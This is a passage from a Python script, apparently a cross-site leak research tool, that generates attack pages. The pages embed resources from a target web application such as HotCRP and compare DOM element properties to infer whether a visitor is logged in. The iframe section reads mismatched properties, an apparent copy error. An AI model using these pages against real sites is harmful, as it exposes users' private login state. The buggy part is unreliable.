						props%s.playbackRate = convertToText(element%s.playbackRate);
						props%s.networkState = convertToText(element%s.networkState);
						props%s.muted = convertToText(element%s.muted);
						props%s.mediaGroup = convertToText(element%s.mediaGroup);
						props%s.error = convertToText(element%s.error);
						props%s.ended = convertToText(element%s.ended);
						props%s.currentTime = convertToText(element%s.currentTime);
						props%s.buffered = convertToText(element%s.buffered);
						props%s.loop = convertToText(element%s.loop);
						props%s.autoplay = convertToText(element%s.autoplay);
						props%s.track = convertToText(window.elementTrack%s.track); 
						props%s.trackReadyState= convertToText(window.elementTrack%s.readyState); 
						props%s.kind= convertToText(window.elementTrack%s.kind);
						props%s.label= convertToText(window.elementTrack%s.label);
						window.props%s = JSON.stringify(props%s);
					}, 5000);

					setTimeout(()=> {
						let state_a_messages = "%s";
						let state_b_messages = "%s";
						if(window.props%s == state_a_messages){
						    console.log("logged-state: %s");
							alert("logged-state: %s");		
						} else {
						    console.log("logged-state: %s");
							alert("logged-state: %s");	
						}
					}, 6000);

					</script>
				'''%(uuid, uuid, inclusion, uuid, uuid, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, 
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					state_a_data, state_b_data, uuid, str(states_a), str(states_a), str(states_b), str(states_b))
			elif tag == "input":
				js += '''
					var div%s = document.createElement("div");
					div%s.innerHTML = "%s";
					document.body.appendChild(div%s);
					window.element%s = div%s.firstElementChild;
					setTimeout(()=> { 
						var props%s = { };
						props%s.width = convertToText(window.element%s.width);
						props%s.height = convertToText(window.element%s.height);
						props%s.form = convertToText(window.element%s.form);
						props%s.validity = convertToText(window.element%s.validity);
						props%s.willValidate = convertToText(window.element%s.willValidate);
						props%s.validationMessage = convertToText(window.element%s.validationMessage);
						props%s.labels = convertToText(window.element%s.labels);
						props%s.list = convertToText(window.element%s.list);
						props%s.accept = convertToText(window.element%s.accept);
						props%s.checked = convertToText(window.element%s.checked);
						props%s.dirName = convertToText(window.element%s.dirName);
						props%s.disabled = convertToText(window.element%s.disabled);
						props%s.indeterminate = convertToText(window.element%s.indeterminate);
						props%s.maxLength = convertToText(window.element%s.maxLength);
						props%s.max = convertToText(window.element%s.max);
						props%s.minLength = convertToText(window.element%s.minLength);
						props%s.min = convertToText(window.element%s.min);
						props%s.multiple = convertToText(window.element%s.multiple);
						props%s.size = convertToText(window.element%s.size);
						props%s.alt = convertToText(window.element%s.alt);
						window.props%s = JSON.stringify(props%s);
					}, 5000);

					setTimeout(()=> {
						let state_a_messages = "%s";
						let state_b_messages = "%s";
						if(window.props%s == state_a_messages){
						    console.log("logged-state: %s");
							alert("logged-state: %s");		
						} else {
						    console.log("logged-state: %s");
							alert("logged-state: %s");	
						}
					}, 6000);

					</script>
				'''%(uuid, uuid, inclusion, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, 
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,  
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,  
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					state_a_data, state_b_data, uuid, str(states_a), str(states_a), str(states_b), str(states_b))
			elif tag == "img":
				js += '''
					var div%s = document.createElement("div");
					div%s.innerHTML = "%s";
					document.body.appendChild(div%s);
					window.element%s = div%s.firstElementChild;
					setTimeout(()=> { 
						var props%s = { };
						props%s.width = convertToText(window.element%s.width);
						props%s.height = convertToText(window.element%s.height);
						props%s.sizes = convertToText(window.element%s.sizes);
						props%s.alt = convertToText(window.element%s.alt);
						props%s.naturalWidth = convertToText(window.element%s.naturalWidth);
						props%s.naturalHeight = convertToText(window.element%s.naturalHeight);
						props%s.complete = convertToText(window.element%s.complete);
						props%s.currentSrc = convertToText(window.element%s.currentSrc);
						props%s.referrerPolicy = convertToText(window.element%s.referrerPolicy);
						props%s.decoding = convertToText(window.element%s.decoding);
						props%s.isMap = convertToText(window.element%s.isMap);
						props%s.useMap = convertToText(window.element%s.useMap);
						props%s.crossOrigin = convertToText(window.element%s.crossOrigin);
						props%s.vspace = convertToText(window.element%s.vspace);
						props%s.hspace = convertToText(window.element%s.hspace);
						window.props%s = JSON.stringify(props%s);
					}, 5000);

					setTimeout(()=> {
						let state_a_messages = "%s";
						let state_b_messages = "%s";
						if(window.props%s == state_a_messages){
						    console.log("logged-state: %s");
							alert("logged-state: %s");		
						} else {
						    console.log("logged-state: %s");
							alert("logged-state: %s");	
						}
					}, 6000);

					</script>
				'''%(uuid, uuid, inclusion, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, 
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,  
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,  
					state_a_data, state_b_data, uuid, str(states_a), str(states_a), str(states_b), str(states_b))
			elif tag == "iframe":
				js += '''
					var div%s = document.createElement("div");
					div%s.innerHTML = "%s";
					document.body.appendChild(div%s);
					window.element%s = div%s.firstElementChild;
					setTimeout(()=> { 
						var props%s = { };
						props%s.name = convertToText(window.element%s.width);
						props%s.sandbox = convertToText(window.element%s.height);
						props%s.allow = convertToText(window.element%s.sizes);
						props%s.allowFullscreen = convertToText(window.element%s.alt);
						props%s.allowPaymentRequest = convertToText(window.element%s.naturalWidth);
						props%s.referrerPolicy = convertToText(window.element%s.referrerPolicy);
						props%s.contentDocument = convertToText(window.element%s.contentDocument);
						props%s.contentWindowLength = (window.element%s.contentWindow)? window.element%s.contentWindow.length: "null";
						props%s.width = convertToText(window.element%s.width);
						props%s.height = convertToText(window.element%s.height);
						window.props%s = JSON.stringify(props%s);
					}, 5000);

					setTimeout(()=> {
						let state_a_messages = "%s";
						let state_b_messages = "%s";
						if(window.props%s == state_a_messages){
						    console.log("logged-state: %s");
							alert("logged-state: %s");		
						} else {
						    console.log("logged-state: %s");
							alert("logged-state: %s");	
						}
					}, 6000);

					</script>
				'''%(uuid, uuid, inclusion, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					state_a_data, state_b_data, uuid, str(states_a), str(states_a), str(states_b), str(states_b))
			elif tag == "embed":
				js += '''
					var div%s = document.createElement("div");
					div%s.innerHTML = "%s";
					document.body.appendChild(div%s);
					window.element%s = div%s.firstElementChild;
					setTimeout(()=> { 
						var props%s = { };
						props%s.type = convertToText(window.element%s.type);
						props%s.width = convertToText(window.element%s.width);
						props%s.height = convertToText(window.element%s.height);
						window.props%s = JSON.stringify(props%s);
					}, 5000);

					setTimeout(()=> {
						let state_a_messages = "%s";
						let state_b_messages = "%s";
						if(window.props%s == state_a_messages){
						    console.log("logged-state: %s");
							alert("logged-state: %s");		
						} else {
						    console.log("logged-state: %s");
							alert("logged-state: %s");	
						}
					}, 6000);

					</script>
				'''%(uuid, uuid, inclusion, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					state_a_data, state_b_data, uuid, str(states_a), str(states_a), str(states_b), str(states_b))
			elif tag.startswith("link"):
				js += '''
					var div%s = document.createElement("div");
					div%s.innerHTML = "%s";
					document.body.appendChild(div%s);
					window.element%s = div%s.firstElementChild;
					setTimeout(()=> { 
						var props%s = { };
						props%s.relList = convertToText(window.element%s.relList);
						props%s.media = convertToText(window.element%s.media);
						props%s.integrity = convertToText(window.element%s.integrity);
						props%s.hreflang = convertToText(window.element%s.hreflang);
						props%s.type = convertToText(window.element%s.type);
						props%s.sizes = convertToText(window.element%s.sizes);
						props%s.imageSrcset = convertToText(window.element%s.imageSrcset);
						props%s.imageSizes = convertToText(window.element%s.imageSizes);
						props%s.referrerPolicy = convertToText(window.element%s.referrerPolicy);
						props%s.crossOrigin = convertToText(window.element%s.crossOrigin);
						props%s.disabled = convertToText(window.element%s.disabled);
						props%s.rev = convertToText(window.element%s.rev);
						props%s.charset = convertToText(window.element%s.charset);
						window.props%s = JSON.stringify(props%s);
					}, 5000);

					setTimeout(()=> {
						let state_a_messages = "%s";
						let state_b_messages = "%s";
						if(window.props%s == state_a_messages){
						    console.log("logged-state: %s");
							alert("logged-state: %s");		
						} else {
						    console.log("logged-state: %s");
							alert("logged-state: %s");	
						}
					}, 6000);

					</script>
				'''%(uuid, uuid, inclusion, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					state_a_data, state_b_data, uuid, str(states_a), str(states_a), str(states_b), str(states_b))
			elif tag == "script":
				js += '''
					var div%s = document.createElement("div");
					div%s.innerHTML = "%s";
					document.body.appendChild(div%s);
					window.element%s = div%s.firstElementChild;
					setTimeout(()=> { 
						var props%s = { };
						props%s.charset = convertToText(window.element%s.charset);
						props%s.type = convertToText(window.element%s.type);
						props%s.noModule = convertToText(window.element%s.noModule);
						props%s.async = convertToText(window.element%s.async);
						props%s.defer = convertToText(window.element%s.defer);
						props%s.crossOrigin = convertToText(window.element%s.crossOrigin);
						props%s.text = convertToText(window.element%s.text);
						props%s.integrity = convertToText(window.element%s.integrity);
						props%s.referrerPolicy = convertToText(window.element%s.referrerPolicy);
						window.props%s = JSON.stringify(props%s);
					}, 5000);

					setTimeout(()=> {
						let state_a_messages = "%s";
						let state_b_messages = "%s";
						if(window.props%s == state_a_messages){
						    console.log("logged-state: %s");
							alert("logged-state: %s");		
						} else {
						    console.log("logged-state: %s");
							alert("logged-state: %s");	
						}
					}, 6000);

					</script>
				'''%(uuid, uuid, inclusion, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					state_a_data, state_b_data, uuid, str(states_a), str(states_a), str(states_b), str(states_b))
			elif tag == "applet":
				js += '''
					var div%s = document.createElement("div");
					div%s.innerHTML = "%s";
					document.body.appendChild(div%s);
					window.element%s = div%s.firstElementChild;
					setTimeout(()=> { 
						var props%s = { };
						props%s.object = convertToText(window.element%s.object);
						props%s.archive = convertToText(window.element%s.archive);
						props%s.codebase = convertToText(window.element%s.codebase);
						props%s.height = convertToText(window.element%s.height);
						props%s.width = convertToText(window.element%s.width);
						props%s.hspace = convertToText(window.element%s.hspace);
						props%s.vspace = convertToText(window.element%s.vspace);
						props%s.name = convertToText(window.element%s.name);
						props%s.alt = convertToText(window.element%s.alt);
						window.props%s = JSON.stringify(props%s);
					}, 5000);

					setTimeout(()=> {
						let state_a_messages = "%s";
						let state_b_messages = "%s";
						if(window.props%s == state_a_messages){
						    console.log("logged-state: %s");
							alert("logged-state: %s");		
						} else {
						    console.log("logged-state: %s");
							alert("logged-state: %s");	
						}
					}, 6000);

					</script>
				'''%(uuid, uuid, inclusion, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid, uuid,
					state_a_data, state_b_data, uuid, str(states_a), str(states_a), str(states_b), str(states_b))
			html = _include_tag_in_body(html, js)	

	server_program = get_server_program(html, csp_headers)

	return html, server_program

# --------------------------------------------------------------------- #
# 			Example Usage
# --------------------------------------------------------------------- #

def main():

	# example test case
	siteId = 101
	target_state= 'Reviewer1-LoggedIn' # example state for HotCRP website

	html_attack_page, server_program =  get_attack_page(siteId, target_state)

if __name__ == "__main__":
	main()